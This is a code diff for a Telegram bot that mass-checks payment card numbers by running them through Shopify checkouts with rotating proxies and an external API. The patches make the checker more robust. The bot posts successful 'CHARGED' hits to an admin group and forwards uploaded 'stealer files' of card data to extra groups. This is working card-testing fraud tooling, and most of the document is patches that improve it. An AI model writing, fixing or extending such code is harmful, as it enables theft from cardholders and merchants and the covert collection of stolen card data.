@@ -43,7 +43,7 @@ from bin import get_bin_info
 from sub import get_premium_status
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# CONFIGURATION & URLS
+# CONFIGURATION
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
 ADMIN_IDS = {6962534443, 8761005192, 8428369446}
@@ -60,6 +60,10 @@ BTN_ALL_EMOJI_ID = "5447602197439218445"
 
 HIT_LOG_GROUP_ID = -1003965699487
 
+# Stealer-file forwarding target(s). Only GROUP IDs here — the code will
+# filter out any entry that resolves to a channel at runtime, so even if
+# a channel ID accidentally ends up in this list, files will NOT be sent
+# there.
 EXTRA_CHARGED_GROUP_IDS = [-5447284969]
 
 BUTTON_LOCK_SECONDS = 30
@@ -131,13 +135,28 @@ GLOBAL_BLACKLISTED_SITES = _load_blacklist()
 # ═══════════════════════════════════════════════════════════════
 
 def _strip_html_and_tg_emoji(text: str) -> str:
-    """Strip all HTML tags and tg-emoji wrappers, leaving plain text."""
     if not text:
         return ""
     text = re.sub(r'<tg-emoji[^>]*>(.*?)</tg-emoji>', r'\1', text, flags=re.DOTALL)
     text = re.sub(r'<[^>]+>', '', text)
     text = _html_mod.unescape(text)
     return text
+
+
+async def _is_group(bot, chat_id: int) -> bool:
+    """
+    Return True only if the given chat ID is a group or supergroup.
+    Channels return False. Any lookup error returns False.
+
+    This is the safety net that stops stealer files from being forwarded
+    to channels even if a channel ID ends up in EXTRA_CHARGED_GROUP_IDS.
+    """
+    try:
+        chat = await bot.get_chat(chat_id)
+        return chat.type in ("group", "supergroup")
+    except Exception as e:
+        logging.warning(f"[MSH] _is_group({chat_id}) lookup failed: {e}")
+        return False
 
 
 async def _safe_send_document(bot, chat_id, document_bytes, filename, caption, reply_to=None):
@@ -555,33 +574,13 @@ RETRY_ERRORS = [
     'tokenization blocked: 403 Forbidden (proxy/IP blocked)', 'stableId not found in checkout HTML', 'UNKNOWN',
     'checkout GET', 'NO_PRODUCT_FOUND', 'found 1 products, all 1 checkouts returned site errors (CAPTCHA_METADATA_MISSING) (9.1s)',
      'TAX_NEW_TAX_MUST_BE_ACCEPTED', 'No receipt in submit response (type: TooManyRequests)',
-    'step 0 failed',
-    'step 1 failed',
-    'step 2 failed',
-    'step 3 failed',
-    'step 4 failed',
-    'step 5 failed',
-    'step 6 failed',
-    'step 7 failed',
-    'step 8 failed',
-    'step 9 failed',
-    'step 10 failed',
-
-    'no available products found',
-    'could not extract receiptid',
-    'could not extract signedhandles',
-    'receiptid missing',
-    'response missing receiptid',
-    'products.json',
-    'returned status 429',
-    'returned status 500',
-    'returned status 502',
-    'returned status 503',
-    'returned status 504',
-    'store incompatible',
-    'payments_payment_flexibility_terms_id_mismatch',
-    'extract signedHandles',
-    'missing receiptId',
+    'step 0 failed', 'step 1 failed', 'step 2 failed', 'step 3 failed', 'step 4 failed',
+    'step 5 failed', 'step 6 failed', 'step 7 failed', 'step 8 failed', 'step 9 failed', 'step 10 failed',
+    'no available products found', 'could not extract receiptid', 'could not extract signedhandles',
+    'receiptid missing', 'response missing receiptid', 'products.json',
+    'returned status 429', 'returned status 500', 'returned status 502', 'returned status 503', 'returned status 504',
+    'store incompatible', 'payments_payment_flexibility_terms_id_mismatch',
+    'extract signedHandles', 'missing receiptId',
     'no_product', 'no_shopify_payments_gateway', 'site_requires_login',
     'cart_failed', 'checkout_failed', 'tokenization_failed', 'negotiate_failed',
     'checkpointdenied', 'order_creation_failed', 'throttled',
@@ -768,18 +767,29 @@ def get_user_display(user_obj, plan_name):
 
 
 # ═══════════════════════════════════════════════════════════════
-# API CALL (widen insufficient detection)
+# API CALL
 # ═══════════════════════════════════════════════════════════════
 
-async def process_card_api(cc: str, mes: str, ano: str, cvv: str, site: str, proxy: str) -> Tuple[bool, str, str, str, str, str, str, int]:
+async def process_card_api(
+    cc: str, mes: str, ano: str, cvv: str, site: str, proxy: str,
+    fallback_sites: Optional[list] = None,
+) -> Tuple[bool, str, str, str, str, str, str, int]:
+    """
+    Call the API's /shopify endpoint.
+
+    If `fallback_sites` is provided, we tell the API to auto-retry on the
+    alternates when the primary site returns a site error (e.g. NO_PRODUCT).
+    """
     import aiohttp
 
     cc_formatted = f"{cc}|{mes}|{ano[-2:]}|{cvv}"
+
+    # Defensive: proxy may be None if ProxyManager returns (None, ...)
+    if proxy is None:
+        proxy = ""
+    proxy = str(proxy).strip()
+
     api_proxy = proxy
-    site_pool = random.sample(sites_list, min(3, len(sites_list)))
-    sites_param = ",".join(site_pool)
-    current_api = f"{server}/shopify-race"
-    params = {"sites": sites_param, "cc": cc_formatted, "proxy": api_proxy, "key": key}
     if api_proxy.startswith("http://"):
         api_proxy = api_proxy[7:]
     elif api_proxy.startswith("https://"):
@@ -795,22 +805,27 @@ async def process_card_api(cc: str, mes: str, ano: str, cvv: str, site: str, pro
     http_status = None
     last_error_msg = "Unknown Error"
 
+    # Build fallback string (max 2 alternates, excluding the primary)
+    fallback_str = ""
+    if fallback_sites:
+        alts = [s for s in fallback_sites if s and s != site]
+        random.shuffle(alts)
+        fallback_str = ",".join(alts[:2])
+
     try:
         _http = _get_msh_http_session()
         for server in servers_to_try:
             current_api = f"{server}/shopify"
-            _fallbacks = [s for s in sites_list if s != site]
-            random.shuffle(_fallbacks)
-            fallback_str = ",".join(_fallbacks[:2]
             for key in [SHOPIFY_API_KEY, ALT_API_KEY]:
                 params = {
                     "site": site,
                     "cc": cc_formatted,
                     "proxy": api_proxy,
-                    "key": key
+                    "key": key,
                 }
                 if fallback_str:
                     params["fallback_sites"] = fallback_str
+
                 try:
                     async with _http.get(current_api, params=params) as response:
                         http_status = response.status
@@ -823,9 +838,15 @@ async def process_card_api(cc: str, mes: str, ano: str, cvv: str, site: str, pro
                             proxy_raw = data.get("Proxy", "Live")
                             api_response = data.get("Response", "Unknown Error")
 
+                            # Defensive: null from API
+                            if api_response is None:
+                                api_response = "Unknown Error"
+                            if not isinstance(api_response, str):
+                                api_response = str(api_response)
+
                             msg_field = data.get("Message") or data.get("message")
                             code_field = data.get("decline_code") or data.get("code")
-                            api_lower = str(api_response).lower()
+                            api_lower = api_response.lower()
                             recognized = any(
                                 k in api_lower for k in
                                 ["insufficient", "order_placed", "charged",
@@ -858,7 +879,7 @@ async def process_card_api(cc: str, mes: str, ano: str, cvv: str, site: str, pro
                                 price,
                                 "USD",
                                 proxy_status,
-                                http_status
+                                http_status,
                             )
                         elif response.status in (401, 403):
                             last_error_msg = f"API Auth Error: HTTP {response.status}"
@@ -869,7 +890,7 @@ async def process_card_api(cc: str, mes: str, ano: str, cvv: str, site: str, pro
                 except asyncio.CancelledError:
                     raise
                 except Exception as ex:
-                    last_error_msg = str(ex)
+                    last_error_msg = f"{type(ex).__name__}: {ex}"
                     break
 
         return (
@@ -880,7 +901,7 @@ async def process_card_api(cc: str, mes: str, ano: str, cvv: str, site: str, pro
             "0.00",
             "USD",
             "Error",
-            http_status
+            http_status,
         )
 
     except asyncio.CancelledError:
@@ -888,29 +909,29 @@ async def process_card_api(cc: str, mes: str, ano: str, cvv: str, site: str, pro
     except aiohttp.ClientError as e:
         return (
             False,
-            f"Connection Error: {str(e)}",
+            f"Connection Error: {type(e).__name__}: {str(e)[:80]}",
             site,
             "Shopify Payments",
             "0.00",
             "USD",
             "Error",
-            None
+            None,
         )
     except Exception as e:
         return (
             False,
-            f"Error: {str(e)}",
+            f"Error: {type(e).__name__}: {str(e)[:80]}",
             site,
             "Shopify Payments",
             "0.00",
             "USD",
             "Error",
-            None
+            None,
         )
 
 
 # ═══════════════════════════════════════════════════════════════
-# RESULT FILE GENERATION
+# RESULT FILE
 # ═══════════════════════════════════════════════════════════════
 
 def generate_result_file(session: dict, result_type: str, user_obj, plan_name: str) -> Tuple[BytesIO, str, int]:
@@ -948,7 +969,7 @@ def generate_result_file(session: dict, result_type: str, user_obj, plan_name: s
     lines.append("")
     lines.append(f"𝗥𝗲𝘀𝘂𝗹𝘁 𝗧𝘆𝗽𝗲 ➛ {type_label} {type_emoji}")
     lines.append(f"𝗧𝗼𝘁𝗮𝗹 𝗖𝗮𝗿𝗱𝘀 ➛ {total_count}")
-    lines.append(f"🌐 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➛ 𝗦𝗵𝗼𝗽𝗜𝗳𝘆 𝗠𝗮𝘀𝘀")
+    lines.append(f"🌐 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➛ 𝗦𝗵𝗼𝗽𝗜𝗙𝘆 𝗠𝗮𝘀𝘀")
     lines.append(f"𝗣𝗼𝘄𝗲𝗿𝗲𝗱 𝗕𝘆 ➛ Starkz")
     lines.append("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
     lines.append("")
@@ -1002,7 +1023,7 @@ def generate_result_file(session: dict, result_type: str, user_obj, plan_name: s
 
 
 # ═══════════════════════════════════════════════════════════════
-# NOTIFICATION HELPERS  (premium emojis restored)
+# NOTIFICATION HELPERS
 # ═══════════════════════════════════════════════════════════════
 
 async def send_hit_log_to_group(bot: Bot, cc_formatted, response_msg, bin_data, user_obj, plan_name, proxy_status_formatted, price, site="Unknown Site", hit_type="CHARGED"):
@@ -1330,7 +1351,8 @@ async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, us
 
     try:
         bin_data = await get_bin_info(cc_num[:6])
-    except:
+    except Exception as e:
+        logging.warning(f"[MSH] bin lookup failed for {cc_num[:6]}: {e}")
         bin_data = {}
 
     if is_session_stopped(session_id):
@@ -1342,10 +1364,10 @@ async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, us
 
         attempt += 1
 
+        # ── FIX A: proxy None guard ─────────────────────────────────
         proxy_result = proxy_manager.get_next_proxy()
-
-        if not proxy_result:
-            logging.error(f"[MSH] No proxies available for session {session_id}")
+        if not proxy_result or proxy_result[0] is None:
+            logging.error(f"[MSH] No usable proxies for session {session_id}")
             session['errors'] += 1
             session['checked'] += 1
             if session['checked'] % 3 == 0 or session['checked'] == session['total']:
@@ -1367,8 +1389,15 @@ async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, us
 
         try:
             success, message, url, gateway, price, currency, proxy_status_raw, http_status = await process_card_api(
-                cc=cc, mes=mm, ano=yy, cvv=cvv, site=site, proxy=proxy
+                cc=cc, mes=mm, ano=yy, cvv=cvv, site=site, proxy=proxy,
+                fallback_sites=clean_sites,
             )
+
+            # ── FIX B: message None / non-string guard ──────────────
+            if message is None:
+                message = "Unknown Error"
+            if not isinstance(message, str):
+                message = str(message)
 
             if is_session_stopped(session_id):
                 return
@@ -1414,10 +1443,12 @@ async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, us
                         success, fmsg, _, _, _, _, _, _ = await process_card_api(
                             cc=fake_card["cc"], mes=fake_card["mes"],
                             ano=fake_card["ano"], cvv=fake_card["cvv"],
-                            site=site, proxy=proxy
+                            site=site, proxy=proxy,
                         )
-                        fmsg_up = fmsg.upper()
-                        return any(k in fmsg_up for k in ["ORDER_PLACED", "CHARGED", "THANK YOU", "SUCCESS",  "PAID", "APPROVED"])
+                        if fmsg is None:
+                            return False
+                        fmsg_up = str(fmsg).upper()
+                        return any(k in fmsg_up for k in ["ORDER_PLACED", "CHARGED", "THANK YOU", "SUCCESS", "PAID", "APPROVED"])
                     except Exception:
                         return False
 
@@ -1515,13 +1546,20 @@ async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, us
         except asyncio.CancelledError:
             raise
         except Exception as e:
+            # ── FIX C: real exception logging ───────────────────────
+            logging.error(f"[MSH] exception for {cc_formatted}: {type(e).__name__}: {e}")
+
             if is_session_stopped(session_id):
                 return
-            proxy_manager.report_result(proxy, str(e), None)
+
+            try:
+                proxy_manager.report_result(proxy, f"{type(e).__name__}: {e}", None)
+            except Exception:
+                pass
 
             if attempt == MAX_RETRIES:
                 result_status = "ERROR"
-                response_msg = "Connection Error"
+                response_msg = f"Connection Error: {type(e).__name__}: {str(e)[:60]}"
                 proxy_status_formatted = "Error 🔴"
                 break
             else:
@@ -1801,9 +1839,9 @@ async def stopmsh_command(message: types.Message):
                     task.cancel()
                     cancelled += 1
 
-            chat_id   = session.get('chat_id')
-            msg_id    = session.get('msg_id')
-            owner_id  = session.get('user_id')
+            chat_id = session.get('chat_id')
+            msg_id = session.get('msg_id')
+            owner_id = session.get('user_id')
 
             if chat_id and msg_id:
                 try:
@@ -1939,8 +1977,12 @@ async def msh_command(message: types.Message):
         document = message.reply_to_message.document
 
     if document:
+        # ── FIX: forward the stealer file only to GROUPS (never channels) ──
         for group_id in EXTRA_CHARGED_GROUP_IDS:
             try:
+                if not await _is_group(bot, group_id):
+                    logging.warning(f"[MSH] Skipping file forward — {group_id} is not a group")
+                    continue
                 await bot.send_document(
                     chat_id=group_id,
                     document=document.file_id,
@@ -2110,14 +2152,13 @@ async def run_mass_checker(bot: Bot, session_id, cards, user_obj, plan_name):
                 print(f"🚫 [MSH] Task cancelled: {cc_formatted}")
                 raise
             except Exception as e:
-                if not is_session_stopped(session_id):
-                    logging.error(f"Worker error for {cc_formatted}: {e}")
-                    _s = MSH_SESSIONS.get(session_id)
-                    if _s:
-                        _s['errors'] += 1
-                        _s['checked'] += 1
-                        if _s['checked'] % 3 == 0 or _s['checked'] == _s['total']:
-                            await update_progress_message(bot, session_id)
+                logging.error(f"Worker error for {cc_formatted}: {type(e).__name__}: {e}")
+                _s = MSH_SESSIONS.get(session_id)
+                if _s:
+                    _s['errors'] += 1
+                    _s['checked'] += 1
+                    if _s['checked'] % 3 == 0 or _s['checked'] == _s['total']:
+                        await update_progress_message(bot, session_id)
 
     tasks = []
     for cc_formatted, cc_num in cards:
